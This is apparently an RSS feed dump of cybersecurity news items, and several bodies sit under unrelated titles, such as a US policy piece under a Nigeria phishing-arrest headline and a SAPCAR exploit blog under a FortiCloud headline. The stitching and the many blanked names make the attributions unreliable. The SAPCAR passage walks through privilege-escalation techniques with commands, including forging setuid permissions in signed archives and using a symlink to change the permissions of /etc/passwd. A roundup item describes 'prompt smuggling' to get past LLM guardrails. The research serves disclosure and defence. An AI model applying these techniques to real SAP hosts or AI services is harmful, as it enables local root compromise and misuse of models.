or computer usage. At the same time, in today's age, should everyone know how to be a mobile or computer power user? That's a subject for another time.So how can we help our new generation of entrepreneurs invest time and build meaningful and innovative solutions?Comment on the post with your ideas!A few things we did with our community in the past few years:Ask startups to give prizes to our CTFs and events, usually access to their tools.Give discounted prices to startups for visibility in events.Give a small advantage to startups that want to give talks about their product, no sales pitch, just technical demos and how it works talks.That's nice, it works, but it's not enough.We don’t lack ideas in cybersecurity. We lack people building and building the right thing.And that’s not because security is too hard, it’s because we’ve made building security unattractive, risky, and inaccessible. We tell young people they are not senior enough, and older engineers that it’s too late to start. On top of that, we romanticize startups, unicorns, and VC money, while ignoring the fact that most real security problems are boring, local, and very real.If we want more people, young and older, to build secure by default products that actually fix real-world issues, we need to change the narrative, incentives and lower the entry cost. People don’t start building because security is important, they start when there is a challenge and a clear problem, real users, and a realistic path to impact and income. Security education alone won’t do it. Ownership, responsibility, and trust do.Some concrete things that might actually help:Fund problems, not pitches. Give money for prototypes solving real issues in cities, schools, SMBs. (I always loved Darpa initiative to pay for hackerspace and "basement" and education projects)Create fellowships or builder programs instead of pushing everyone to “do a startup”.Pair juniors with experienced practitioners who have seen real incidents, and train them (shadowing ftw!).Reward prevention and boring success, not just exploits, alerts, and clever attacks.If we want a more secure society, we need to stop expecting everyone to become a security expert. We need to help builders create products where security is implicit, invisible, and just works. That won’t come from more talks or more fear. It will come from giving people permission, support, and real problems worth solving. And definitely... finance those approach!Oh! And please, start hiring juniors and train them. We need more people in cybersecurity, so many articles and research say that, but there are mostly no jobs for juniors, making those “research” totally invalid when confronted with the market.]]></content:encoded></item><item><title>Nigeria arrests dev of Microsoft 365 &apos;Raccoon0365&apos; phishing platform</title><link>https://www.bleepingcomputer.com/news/security/nigeria-arrests-dev-of-microsoft-365-raccoon0365-phishing-platform/</link><author>Bill Toulas</author><category>security</category><pubDate>Fri, 19 Dec 2025 19:05:32 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[The Nigerian police have arrested three individuals linked to targeted Microsoft 365 cyberattacks via Raccoon0365 phishing-as-a-service.

These shifts, along with the president’s efforts to restrict free speech and freedom of the press, have come at such a rapid clip that many readers probably aren’t even aware of them all.President Trump has repeatedly claimed that a primary reason he lost the 2020 election was that social media and Big Tech companies had conspired to silence conservative voices and stifle free speech. Naturally, the president’s impulse in his second term has been to use the levers of the federal government in an effort to limit the speech of everyday Americans, as well as foreigners wishing to visit the United States.In September, Donald Trump signed a national security directive known as NSPM-7, which directs federal law enforcement officers and intelligence analysts to target “anti-American” activity, including any “tax crimes” involving extremist groups who defrauded the IRS. According to extensive reporting by journalist , the focus of the order is on those expressing “opposition to law and immigration enforcement; extreme views in favor of mass migration and open borders; adherence to radical gender ideology,” as well as “anti-Americanism,” “anti-capitalism,” and “anti-Christianity.”Earlier this month, Attorney General Pam Bondiissued a memo advising the FBI to compile a list of Americans whose activities “may constitute domestic terrorism.” Bondi also ordered the FBI to establish a “cash reward system” to encourage the public to report suspected domestic terrorist activity. The memo states that domestic terrorism could include “opposition to law and immigration enforcement” or support for “radical gender ideology.”The Trump administration also is planning to impose social media restrictions on tourists as the president continues to ramp up travel restrictions for foreign visitors. According to a notice from U.S. Customs and Border Protection (CBP), tourists — including those from Britain, Australia, France, and Japan — will soon be required to provide five years of their social media history.The CBP said it will also collect “several high value data fields,” including applicants’ email addresses from the past 10 years, their telephone numbers used in the past five years, and names and details of family members. Wired reported in October that the US CBP executed more device searches at the border in the first three months of the year than any other previous quarter.The new requirements from CBP add meat to the bones of , which in the name of combating “foreign terrorist and public safety threats” granted broad new authority that civil rights groups warn could enable a renewed travel ban and expanded visa denials or deportations based on perceived ideology. Critics alleged the order’s vague language around “public safety threats,” creates latitude for targeting individuals based on political views, national origin, or religion. At least 35 nations are now under some form of U.S. travel restrictions.In February, Trump ordered executive branch agencies to stop enforcing the U.S. Foreign Corrupt Practices Act, which froze foreign bribery investigations, and even allows for “remedial actions” of past enforcement actions deemed “inappropriate.”The White House also disbanded the Kleptocracy Asset Recovery Initiative and  — units which proved their value in corruption cases and in seizing the assets of sanctioned Russian oligarchs — and diverted resources away from investigating white-collar crime.Also in February, Attorney General Pam Bondi dissolved the FBI’s Foreign Influence Task Force, an entity created during Trump’s first term designed to counter the influence of foreign governments on American politics.In March 2025, Reuters reported that several U.S. national security agencies had halted work on a coordinated effort to counter Russian sabotage, disinformation and cyberattacks. Former President Joe Biden had ordered his national security team to establish working groups to monitor the issue amid warnings from U.S. intelligence that Russia was escalating a shadow war against Western nations.In a test of prosecutorial independence, Trump’s Justice Department ordered prosecutors to drop the corruption case against New York Mayor . The fallout was immediate: Multiple senior officials resigned in protest, the case was reassigned, and chaos engulfed the Southern District of New York (SDNY) – historically one of the nation’s most aggressive offices for pursuing public corruption, white-collar crime, and cybercrime cases.When it comes to cryptocurrency, the administration has shifted regulators at the U.S. Securities and Exchange Commission (SEC) away from enforcement to cheerleading an industry that has consistently been plagued by scams, fraud and rug-pulls. The SEC in 2025 systematically retreated from enforcement against cryptocurrency operators, dropping major cases against , , and others.Perhaps the most troubling example involves , the Chinese-born founder of crypto currency company . In 2023, the SEC charged Sun with fraud and market manipulation. Sun subsequently invested $75 million in the Trump family’s  (WLF) tokens, became the top holder of the $TRUMP memecoin, and secured a seat at an exclusive dinner with the president.In late February 2025, the SEC dropped its lawsuit. Sun promptly took Tron public through a reverse merger arranged by Dominari Securities, a firm with Trump family ties. Democratic lawmakers have urged the SEC to investigate what they call “concerning ties to President Trump and his family” as potential conflicts of interest and foreign influence.In October, President Trump pardoned , the founder of the world’s largest cryptocurrency exchange . In 2023, Zhao and his company pled guilty to failing to prevent money laundering on the platform. Binance paid a $4 billion fine, and Zhao served a four-month sentence. As  observed last month, shortly after Zhao’s pardon application, he was at the center of a blockbuster deal that put the Trump’s family’s WLF on the map.“Zhao is a citizen of the United Arab Emirates in the Persian Gulf and in May, an Emirati fund put $2 billion in Zhao’s Binance,” 60 Minutes reported. “Of all the currencies in the world, the deal was done in World Liberty crypto.” has made the agency’s new posture towards crypto explicit, stating “most crypto tokens are not securities.” At the same time, President Trump has directed the  and the SEC to expand 401(k) access to private equity and crypto — assets that regulators have historically restricted for retail investors due to high risk, fees, opacity, and illiquidity. The executive order explicitly prioritizes “curbing ERISA litigation,” and reducing accountability for fiduciaries while shifting risk onto ordinary workers’ retirement savings.At the White House’s behest, the U.S. Treasury in March suspended the Corporate Transparency Act, a law that required companies to reveal their real owners. Finance experts warned the suspension would bring back shell companies and “open the flood gates of dirty money” through the US, such as funds from drug gangs, human traffickers, and fraud groups.Trump’s clemency decisions have created a pattern of freed criminals committing new offenses, including , whose sentence for drug trafficking was commuted during Trump’s first term, was found guilty in 2025 of violating supervised release and faces new charges., who received a commutation in January 2021 for running a Ponzi scheme, was sentenced in November 2025 to 37 years for running a new Ponzi scheme. The administration has also granted clemency to a growing list of white-collar criminals: , a private equity executive sentenced to seven years for securities and wire fraud (functionally a ponzi-like scheme), and , the Nikola founder sentenced to four years for defrauding investors over electric vehicle technology. The message: Financial crimes against ordinary investors are no big deal.The administration also imposed sanctions against the International Criminal Court (ICC). On February 6, 2025, Executive Order 14203 authorized asset freezes and visa restrictions against ICC officials investigating U.S. citizens or allies, primarily in response to the ICC’s arrest warrants for Israeli Prime Minister Benjamin Netanyahu over alleged war crimes in Gaza.Earlier this month the president launched the “,” a visa scheme established by an executive order in September that offers wealthy individuals and corporations expedited paths to U.S. residency and citizenship in exchange for $1 million for individuals and $2 million for companies, plus ongoing fees. The administration says it is also planning to offer a “platinum” version of the card that offers special tax breaks — for a cool $5 million.President Trump campaigned for a second term insisting that the previous election was riddled with fraud and had been stolen from him. Shortly after Mr. Trump took the oath of office for a second time, he fired the head of the Cybersecurity and Infrastructure Security Agency (CISA) —  (no relation) — for having the audacity to state publicly that the 2020 election was the most secure in U.S. history.Mr. Trump revoked Krebs’s security clearances, ordered a Justice Department investigation into his election security work, and suspended the security clearances of employees at , the cybersecurity firm where Krebs worked as chief intelligence and public policy officer. The executive order was the first direct presidential action against any US cybersecurity company. Krebs subsequently resigned from SentinelOne, telling The Wall Street Journal he was leaving to push back on Trump’s efforts “to go after corporate interests and corporate relationships.”The president also dismissed all 15 members of the Cyber Safety Review Board (CSRB), a nonpartisan government entity established in 2022 with a mandate to investigate the security failures behind major cybersecurity events — likely because those advisors included Chris Krebs.At the time, the CSRB was in the middle of compiling a much-anticipated report on the root causes of Chinese government-backed digital intrusions into at least nine U.S. telecommunications providers. Not to be outdone, the Federal Communication Commission quickly moved to roll back a previous ruling that required U.S. telecom carriers to implement stricter cybersecurity measures.Meanwhile, CISA has lost roughly a third of its workforce this year amid mass layoffs and deferred resignations. When the government shutdown began in October, CISA laid off even more employees and furloughed 65 percent of the remaining staff, leaving only 900 employees working without pay.Additionally, the Department of Homeland Security has reassigned CISA cyber specialists to jobs supporting the president’s deportation agenda. As reported earlier this year, CISA employees were given a week to accept the new roles or resign, and some of the reassignments included relocations to new geographic areas.The White House has signaled that it plans to cut an additional $491 million from CISA’s budget next year, cuts that primarily target CISA programs focused on international affairs and countering misinformation and foreign propaganda. The president’s budget proposal justified the cuts by repeating debunked claims about CISA engaging in censorship.The Trump administration has pursued a similar reorganization at the FBI: reported in October that a quarter of all FBI agents have now been reassigned from national security threats to immigration enforcement. Reuters reported last week that the replacement of seasoned leaders at the FBI and Justice Department with Trump loyalists has led to an unprecedented number of prosecutorial missteps, resulting in a 21 percent dismissal rate of the D.C. U.S. attorney’s office criminal complaints over eight weeks, compared to a mere .5% dismissal rate over the prior 10 years.“These mistakes are causing department attorneys to lose credibility with federal courts, with some judges quashing subpoenas, threatening criminal contempt and issuing opinions that raise questions about their conduct,” Reuters reported. “Grand juries have also in some cases started rejecting indictments, a highly unusual event since prosecutors control what evidence gets presented.”In August, the DHS banned state and local governments from using cyber grants on services provided by the Multi-State Information Sharing and Analysis Center (MS-ISAC), a group that for more than 20 years has shared critical cybersecurity intelligence across state lines and provided software and other resources at free or heavily discounted rates. Specifically, DHS barred states from spending funds on services offered by the Elections Infrastructure ISAC, which was effectively shuttered after DHS pulled its funding in February.reports that the Trump administration’s massive workforce cuts, along with widespread mission uncertainty and a persistent leadership void, have interrupted federal agencies’ efforts to collaborate with the businesses and local utilities that run and protect healthcare facilities, water treatment plans, energy companies and telecommunications networks. The publication said the changes came after the US government eliminated CIPAC — a framework that allowed private companies to share cyber and threat intel without legal penalties.“Government leaders have canceled meetings with infrastructure operators, forced out their longtime points of contact, stopped attending key industry events and scrapped a coordination program that made companies feel comfortable holding sensitive talks about cyberattacks and other threats with federal agencies,” Cybersecurity Dive’s  wrote.Both the  (NSA) and  have been without a leader since Trump dismissed Air Force General Timothy Haugh in April, allegedly for disloyalty to the president and at the suggestion of far-right conspiracy theorist Laura Loomer. The nomination of Army Lt. Gen. William Hartman for the same position fell through in October. The White House has ordered the NSA to cut 8 percent of its civilian workforce (between 1,500 and 2,000 employees).As reported in August, the Office of the Director of National Intelligence plans to dramatically reduce its workforce and cut its budget by more than $700 million annually. Director of National Intelligence  said the cuts were warranted because ODNI had become “bloated and inefficient, and the intelligence community is rife with abuse of power, unauthorized leaks of classified intelligence, and politicized weaponization of intelligence.”The firing or forced retirements of so many federal employees has been a boon to foreign intelligence agencies. Chinese intelligence agencies, for example, reportedly moved quickly to take advantage of the mass layoffs, using a network of front companies to recruit laid-off U.S. government employees for “consulting work.” Former workers with the Defense Department’s  who resigned en-masse earlier this year thanks to DOGE encroaching on their mission have been approached by the United Arab Emirates to work on artificial intelligence for the oil kingdom’s armed forces, albeit reportedly with the blessing of the Trump administration.President Trump has filed multibillion-dollar lawsuits against a number of major news outlets over news segments or interviews that allegedly portrayed him in a negative light, suing the networks , the , the  parent company , , and , among others.The president signed an executive order aimed at slashing public subsidies to  and , alleging “bias” in the broadcasters’ reporting. In July, Congress approved a request from Trump to cut $1.1 billion in federal funding for the Corporation for Public Broadcasting, the nonprofit entity that funds PBS and NPR., the president’s pick to run the Federal Communications Commission (FCC), initially pledged to “dismantle the censorship cartel and restore free speech rights for everyday Americans.” But on January 22, 2025, the FCC reopened complaints against ABC, CBS and  over their coverage of the 2024 election. The previous FCC chair had dismissed the complaints as attacks on the First Amendment and an attempt to weaponize the agency for political purposes.President Trump in February seized control of the White House Correspondents’ Association, the nonprofit entity that decides which media outlets should have access to the White House and the press pool that follows the president. The president invited an additional 32 media outlets, mostly conservative or right-wing organizations.According to the journalism group Poynter.org, there are three religious networks, all of which lean conservative, as well as a mix of outlets that includes a legacy paper, television networks, and a digital outlet powered by artificial intelligence.  Trump also barred  from the White House over their refusal to refer to the Gulf of Mexico as the Gulf of America.Under Trump appointee , the U.S. Agency for Global Media moved to dismantle , Radio Free Europe/Radio Liberty, and other networks that for decades served as credible news sources behind authoritarian lines. Courts blocked shutdown orders, but the damage continues through administrative leave, contract terminations, and funding disputes.President Trump this term has fired most of the people involved in processing Freedom of Information Act (FOIA) requests for government agencies. FOIA is an indispensable tool used by journalists and the public to request government records, and to hold leaders accountable.Petitioning the government, particularly when it ignores your requests, often requires challenging federal agencies in court. But that becomes far more difficult if the most competent law firms start to shy away from cases that may involve crossing the president and his administration. On March 22, the president issued a memorandum that directs heads of the Justice and Homeland Security Departments to “seek sanctions against attorneys and law firms who engage in frivolous, unreasonable and vexatious litigation against the United States,” or in matters that come before federal agencies.The Trump administration announced increased vetting of applicants for H-1B visas for highly skilled workers, with an internal State Department memo saying that anyone involved in “censorship” of free speech should be considered for rejection., issued in 2025 on “foreign terrorist and public safety threats,” granted broad new authority that civil rights groups warn could enable a renewed travel ban and expanded visa denials or deportations based on perceived ideology. Critics charged that the order’s vague language around “public safety threats” creates latitude for targeting individuals based on political views, national origin, or religion.CONSUMER PROTECTION, PRIVACYAt the beginning of this year, President Trump ordered staffers at the Consumer Financial Protection Bureau (CFPB) to stop most work. Created by Congress in 2011 to be a clearinghouse of consumer complaints, the CFPB has sued some of the nation’s largest financial institutions for violating consumer protection laws. The CFPB says its actions have put nearly $18 billion back in Americans’ pockets in the form of monetary compensation or canceled debts, and imposed $4 billion in civil money penalties against violators.The Trump administration said it planned to fire up to 90 percent of all CFPB staff, but a recent federal appeals court ruling in Washington tossed out an earlier decision that would have allowed the firings to proceed. Reuters reported this week that an employee union and others have battled against it in court for ten months, during which the agency has been almost completely idled.The CFPB’s acting director is , a key architect of the GOP policy framework Project 2025. Under Vought’s direction, the CFPB in May quietly withdrew a data broker protection rule intended to limit the ability of U.S. data brokers to sell personal information on Americans.Despite the Federal Reserve’s own post-mortem explicitly blaming Trump-era deregulation for the 2023 Silicon Valley Bank collapse, which triggered a fast-moving crisis requiring emergency weekend bailouts of banks, Trump’s banking regulators in 2025 doubled down. They loosened capital requirements, narrowed definitions of “unsafe” banking practices, and stripped specific risk categories from supervisory frameworks. The setup for another banking crisis requiring taxpayer intervention is now in place.The Privacy Act of 1974, one of the few meaningful federal privacy laws, was built on the principles of consent and separation in response to the abuses of power that came to light during the Watergate era. The law states that when an individual provides personal information to a federal agency to receive a particular service, that data must be used solely for its original purpose.Nevertheless, it emerged in June that the Trump administration has built a central database of all US citizens. According to NPR, the White House plans to use the new platform during upcoming elections to verify the identity and citizenship status of US voters. The database was built by the Department of Homeland Security and the Department of Governmental Efficiency and is being rolled out in phases to US states.Probably the biggest ungotten scoop of 2025 is the inside story of what happened to all of the personal, financial and other sensitive data that was accessed by workers at the so-called Department of Government Efficiency (DOGE). President Trump tapped  to lead the newly created department, which was mostly populated by current and former employees of Musk’s various technology companies (including a former denizen of the cybercrime community known as the “Com”). It soon emerged that the DOGE team was using artificial intelligence to surveil at least one federal agency’s communications for hostility to Mr. Trump and his agenda.DOGE employees were able to access and synthesize data taken from a large number of previously separate and highly guarded federal databases, including those at the Social Security Administration, the Department of Homeland Security, the Office of Personnel Management, and the U.S. Department of the Treasury. DOGE staffers did so largely by circumventing or dismantling security measures designed to detect and prevent misuse of federal databases, including standard incident response protocols, auditing, and change-tracking mechanisms.For example, an IT expert with the National Labor Relations Board (NLRB) alleges that DOGE employees likely downloaded gigabytes of data from agency case files in early March, using short-lived accounts that were configured to leave few traces of network activity. The NLRB whistleblower said the large data outflows coincided with multiple blocked login attempts from addresses in Russia, which attempted to use valid credentials for a newly-created DOGE user account.The stated goal of DOGE was to reduce bureaucracy and to massively cut costs — mainly by eliminating funding for a raft of federal initiatives that had already been approved by Congress. The DOGE website claimed those efforts reduced “wasteful” and “fraudulent” federal spending by more than $200 billion. However, multiple independent reviews by news organizations determined the true “savings” DOGE achieved was off by a couple of orders of magnitude, and was likely closer to $2 billion.At the same time DOGE was slashing federal programs, President Trump fired at least 17 inspectors general at federal agencies — the very people tasked with actually identifying and stopping waste, fraud and abuse at the federal level. Those included several agencies (such as the NLRB) that had open investigations into one or more of Mr. Musk’s companies for allegedly failing to comply with protocols aimed at protecting state secrets. In September, a federal judge found the president unlawfully fired the agency watchdogs, but none of them have been reinstated.Where is DOGE now?  reported last month that as far as the White House is concerned, DOGE no longer exists, even though it technically has more than half a year left to its charter. Meanwhile, who exactly retains access to federal agency data that was fed by DOGE into AI tools is anyone’s guess.KrebsOnSecurity would like to thank the anonymous researcher NatInfoSec for assisting with the research on this story.]]></content:encoded></item><item><title>Over 25,000 FortiCloud SSO devices exposed to remote attacks</title><link>https://www.bleepingcomputer.com/news/security/over-25-000-forticloud-sso-devices-exposed-to-remote-attacks/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Fri, 19 Dec 2025 15:00:45 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Internet security watchdog Shadowserver has found over 25,000 Fortinet devices exposed online with FortiCloud SSO enabled, amid ongoing attacks targeting a critical authentication bypass vulnerability.

I recommend having a look at the original post, along with the tool SAPCARve I released on our GitHub page, as this is the continuation of my journey.As we all know, client engagements are time-boxed. As a result, I had limited time to work on a proof of concept for the project and had to restrict the scope of my investigation. When preparing the original blog post, I took the time to revisit the SAPCAR utility program. Since I found out that it was being used by SAP setuid binaries, a vulnerability in SAPCAR could lead to potentially interesting privilege escalation.Today, I'm presenting four (4) vulnerabilities that I responsibly disclosed to SAP and that were later fixed. The vulnerabilities could result in local privilege escalations from  to  on SAP systems, similar to my original blog post: – SAPCAR: Extraction can override permissions of current and parent directories – SAPCAR: Memory corruption (OOB write) when parsing crafted CAR archivesQuick refresher: SAPCAR is an SAP utility to parse SAP's proprietary SAR archive file format. See it as the equivalent of WinRAR.When reversing the SAPCAR binary using Ghidra, I noticed a fallback mechanism when SAR archives parsing failed. When an error occurred, due to an incorrect format for example, SAPCAR then started parsing the archive using  as follows:iVar4 = sscanf((char *)&local_1168,"%c %s %5o %10lu %9lu %10ld
%10lu",&local_3c,local_2168,&local_40,&local_48,&local_60,&local_58,&local_68);After some digging, I found a previous research presentation on SAPCAR from Troopers dating back from 2016, whose slide 11 mentions the "CAR archive header":Looking at the first line (after the comment), it matched the  call I saw. As it turns out, SAR is a newer version of the CAR format. CAR used an ASCII header, while SAR introduced binary blocks and added support for signatures. When SAPCAR parses a SAR archive and fails, it then tries again to parse it, this time using the older CAR format for backward compatibility.I also found the following page providing additional historical context about SAPCAR and its CAR/SAR formats, confirming my intuition.Out of curiosity, I modified my  script to generate a CAR archive using the same logic as the  call. And it was successfully parsed on my SAP HANA express edition virtual machine, showing that CAR archives are still accepted by modern deployments.In my previous attempt crafting an exploit for CVE-2024-47595, one path I explored but did not mention was the  option when injecting CLI arguments:-xnopvalid : Do not validate file paths during extraction, such as removing the
             drive letter/leading slashes in file paths and normalizing directory
             traversal commands like ../ to prevent directory traversal attack
             (use this option with caution at your own risk)By default, SAPCAR validates and normalizes paths when parsing SAR archives to prevent path traversal attacks. Only when you specify the  option are you able to disable those mitigations.However, what I found out is that when SAPCAR falls back to parsing CAR archives, that parsing path does not apply the same validation checks (CVE-2025-42970). Specifying an absolute path in the CAR archive will result in SAPCAR extracting it as-is on the filesystem, applying the permissions specified in the archive.Below is an example with a CAR archive containing an entry named  being extracted by SAPCAR to the local filesystem under , with world-readable and writable permissions:hxeadm@hxehost:/usr/sap/HXE/HDB90> head test.car
# CAR archive header
F /tmp/foobar.txt 777 7 16 1740082248 792741945

-rwxrwxrwx 1 hxeadm sapsys 7 Feb 20 2025 /tmp/foobar.txtUnfortunately for me, I could not leverage this alternative parsing path in my original exploit. Because CAR archives do not support signature manifests, SAPCAR will throw an error when asked to verify the archive's signature. And the  setuid binary enforces signature verification with the  argument placed before my injection point.Let's move on to the signature manifest itself. Reversing crypto-related code is a hard task, so I focused on logic errors instead, such as missing signatures, tampered algorithms or versions, malformed file names, and so on.As a refresher, here is what a SAR signature manifest looks like (stored in  in the archive and can be extracted using the  command):SAP-MANIFEST

-----BEGIN SIGNATURE-----

-----END SIGNATURE-----A natural question that came up was: what is included in the hashes that are then signed? Is it the SAR blocks or the content of the file itself?A quick test confirmed that it was the content of the file itself. Why is that an issue?headers unsigned (CVE-2025-42992). Among the metadata we find some interesting fields, such as the file's permissions!Using , I took a genuine, signed SAR archive and changed the permissions of one of the files to set the bit:$ python3 SAPCARve.py tp.sar chmod 1 --perms 0o4777

If an archive contains a file named  and you're located inside the directory  for example, SAPCAR will extract  to /home/myuser/dir1/dir2/file1 .When handling  sequences, SAPCAR will normalize the final path, creating it under the current directory. So, assuming you're still in  and the SAR archive contains a file named , it will be extracted to .So how about injecting the current  and parent  directory with world-writeable permissions in a signed SAR archive (CVE- 2025-43001)?

Since  specifies the archive directory /usr/sap/hostctrl/work/archive where to extract the files, we could effectively change the permissions of both  and archive to our advantage.RG , DR and LK block typesBut wait, there is more! In addition to regular files and directories, SAR supports another block type: symbolic links, with the type  .Furthermore, SAPCAR has an interesting behavior. When inserting a directory in a SAR archive, SAPCAR will first check whether it exists before attempting to create it. But regardless of the outcome, SAPCAR will still apply the permissions afterward.Let's take an example by adding the directory  to an archive and extracting it:$ strace SAPCAR -xvf tp_add_dir.sar
# ...
access("anvil", F_OK) = -1 ENOENT (No such file or directory)
mkdir("anvil", 0755) = 0
# ...
chmod("anvil", 0777) = 0
# ...As seen in the  output, SAPCAR will check whether  already exists (it doesn't), create it, and then change the permissions.Now, let's compare to when the directory  already exists:$ echo hello > anvil
$ strace SAPCAR -xvf tp_add_dir.sar
# ...
access("anvil", F_OK) = 0
# ...
chmod("anvil", 0777) = 0
# ...This time,  isn't called because  already exists. But SAPCAR still changes the permissions to the ones specified in the SAR archive.Now, we can abuse this by first inserting a symbolic link and then a directory with the same name. When processing the archive, SAPCAR will:Process the  block and create the  symbolic link to our target (e.g. ).Process the  block, call , see that  exists (it's our symbolic link) and skip the call to .Finally, apply the permissions specified in the  block, which is in fact our symbolic link , which ends up setting those permissions on our symlink's target.Using  once again, I took the same genuine, signed SAR archive and inserted a new symbolic link from  to , followed by a new directory named  whose permissions were set to world-readable and writable. This produced the following archive (the pipe | character denotes the symbolic link, with name on the left and target on the right):$ python3 SAPCARve.py tp.sar add sym 'anvil|/etc/passwd'

Namely, the timestamp, code page, and user-info fields. I will note that I did not see SAPCAR use those fields in any way, except showing the timestamp when listing the content of the archive.At the beginning of the blog, I mentioned 4 vulnerabilities but only covered 3 so far. The 4th one, while not as interesting as the others in my opinion, represented the start of my next journey: black-box fuzzing of SAPCAR.Considering the many issues found so far just focusing on logic, and considering Troopers' success in finding issues via fuzzing, I thought I should give fuzzing a try. The last time I tried black-box fuzzing, I used Intel's Pin framework for dynamic instrumentation. I thought I should revisit black-box fuzzing and see how far it had progressed since. It was the perfect excuse to try AFL++ with its Frida mode (and it's impressive to realize how far indeed it has come!).My first attempt (using the -O Frida mode) was primitive and slow, to say the least, simply running SAPCAR to list the content of the corpus files:$ taskset -c 0-3 afl-fuzz -i corpus -o findings -m none -O -- ./SAPCAR --tf @@So, between 6 and 20 executions per second. That's understandable considering the many IO operations, file decompression, and computation and validation of the signature, to name a few reasons.To my surprise, it still uncovered a memory corruption issue within its first 48h of running, our 4th and final vulnerability for this blog post: an out-of-bounds write when normalizing paths in CAR archives (CVE-2025-42971).The smaller test case looked as follows:$ cat oob_write.sar
a/../ 1 2 33 4 
$ SAPCAR -xvf oob_write.sar

double free or corruption (out)
AbortedDebugging SAPCAR with GEF and tracing it back in the binary using Ghidra, I came to understand that SAPCAR suffered from an off-by-one error when the filename starts with  (in the test case above, the filename is simply , the leading a character being treated as the file type).When seeing , SAPCAR will attempt to normalize the path by moving what's on the right to the left. For example, when seeing , it will move  to . The problem arises when there is no left part to begin with. So, when parsing , it will end up moving  at offset -1 of the path, writing  one byte before the path starts.And it's possible to chain multiple  sequences to keep walking backward. So  will first write  at offset -1, then  at offset -2. Then  will write  at offset -1,  at offset -2,  at offset -3, so on.As we keep going backward, we can end up overwriting the size of the current glibc heap chunk in memory. For example, with /../../../ [...] /../../../AAAAAAAAAAAA:Chunk(addr=0xa43520, size=0x41414141414140, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[0x0000000000a43520 41 41 41 00 41 41 41 00 41 41 41 00 41 41 41 00 AAA.AAA.AAA.AAA.]We can see that the chunk size was overridden with . I didn't explore it further, though, as it seemed tedious to exploit, and I already had more easily exploitable vulnerabilities.If you're interested in low-level memory exploit write-ups, consider reading Martin Gallo and Maximiliano Vidal from Core Security's blog post from 2021, where they go over how they successfully turned a heap-based buffer overflow in SAPCAR into a working exploit.I'm ending the blog post here, but our journey is not over. Setting up black-box fuzzing against SAPCAR led me down to yet another rabbit hole, trying to speed up AFL++, minimize the corpus, and write a better, more efficient harness.To my surprise, my research shifted away from SAPCAR and led to a potential pre-authentication RCE affecting most SAP software. If it seems quite puzzling how one could go from SAPCAR to an RCE affecting most SAP software, I hear you. In a way, I hope to have piqued your interest, and I invite you to stay tuned for my next blog post documenting the last leg of my journey.]]></content:encoded></item><item><title>The Good, the Bad and the Ugly in Cybersecurity – Week 51</title><link>https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-51-8/</link><author>SentinelOne</author><category>threatintel</category><enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/12/GBU_week51.jpg" length="" type=""/><pubDate>Fri, 19 Dec 2025 14:00:24 +0000</pubDate><source url="https://www.sentinelone.com/">SentinelOne Blog</source><content:encoded><![CDATA[The Good | Authorities Dismantle Global Fraud Ring and Crypto Laundering NetworkEurojust officials have .

A new report delves into the 51% year-over-year increase, which marks the most severe year on record for DPRK-linked crypto crime while accounting for roughly 76% of all service compromises. Cumulatively, North Korean actors are now estimated to have stolen at least $6.75 billion in cryptocurrency.A single incident, attributed to the TraderTraitor cluster, dominated the year: the February breach of Bybit that resulted in losses of approximately $1.5 billion. Beyond Bybit, DPRK-linked actors are also suspected in the theft of $36 million from South Korea’s most popular cryptocurrency exchange, Upbit.These operations roll up into what is widely referred to as the Lazarus Group, a long-running threat actor tied to Pyongyang’s Reconnaissance General Bureau (RBG), which has historically blended large-scale crypto heists with espionage campaigns such as Contagious Interview, a campaign using fake recruitment-themed lures to deliver malware and harvest job applicant’s data.The growing scale of DPRK-linked crypto theft shows the profitability of high-value, state-backed operations, also incentivizing other actors to adopt similar tactics, including advanced laundering schemes, affiliate-based attacks, and cross-border exploitation.For the broader ecosystem, North Korean threat operations continue to both normalize large-scale crypto heists and accelerate the professionalization of illicit networks, complicating attribution and straining global law enforcement resources.The Ugly | Threat Actors Upscaling Abilities with Widespread Adoption of LLMsRansomware operations are undergoing a rapid, dangerous transformation not through novel “super-hacks” but via the industrialized efficiency of Large Language Models (LLMs). A new report by SentinelLABS assesses that . The researchers say that threat actors are now automating reconnaissance, generating localized phishing lures, and triaging massive datasets across language barriers with unprecedented speed and accuracy with the help of LLMs. Ransomware-as-a-Service operators are already claiming to offer AI-assisted tools to affiliates to increase attack productivity.SentinelLABS says attackers are successfully evading commercial guardrails through “prompt smuggling”, a process by which . The outputs are then stitched together offline to build working attack tools.The researchers predict that top-tier actors will go further, likely migrating to self-hosted, open-source models like Ollama to entirely avoid provider guardrails. This evolution would allow criminals to operate without telemetry or censorship, effectively weaponizing unrestricted AI. . Anthropic has reported on tools like Claude Code being used to automate entire extortion chains, from technical reconnaissance to calculating optimal ransom demands. In other instances, malware such as QUIETVAULT has been seen hijacking a victim’s own locally installed LLMs to intelligently hunt for crypto-wallets and sensitive files. While the report adds to the general industry concern around the use of AI by threat actors, it also debunks one of the wider myths in common circulation. The risk from today’s LLMs, the researchers say, isn’t superintelligent malware or novel attack vectors, it’s the more mundane , factors that increasingly complicate attribution and challenge defenders to adapt to a significantly higher-volume threat landscape.]]></content:encoded></item><item><title>CISA warns ASUS Live Update backdoor is still exploitable, seven years on</title><link>https://www.malwarebytes.com/blog/news/2025/12/cisa-warns-asus-live-update-backdoor-is-still-exploitable-seven-years-on</link><author></author><category>threatintel</category><pubDate>Fri, 19 Dec 2025 13:56:36 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[The KEV catalog lists vulnerabilities that are known to be exploited in the wild and sets patch deadlines for Federal Civilian Executive Branch (FCEB) agencies. When CISA adds an issue to this list, it’s a strong signal that exploitation is real, ongoing, and urgent.The ASUS Live Update Embedded Malicious Code vulnerability, tracked as CVE-2025-59374 (with a CVSS score of 9.3), affects Live Update, a utility commonly used to deliver firmware and software updates to ASUS devices.This isn’t the first time ASUS Live Update has been linked to serious security incidents. In 2019, ASUS responded to media reports about attacks on the Live Update tool by advanced persistent threat (APT) groups, stating that:“A small number of devices have been implanted with malicious code through a sophisticated attack on our Live Update servers in an attempt to target a very small and specific user group.”Later investigations revealed that a sophisticated supply chain attack mounted in 2018, attributed to Chinese state-sponsored attackers, had inserted a backdoor into ASUS 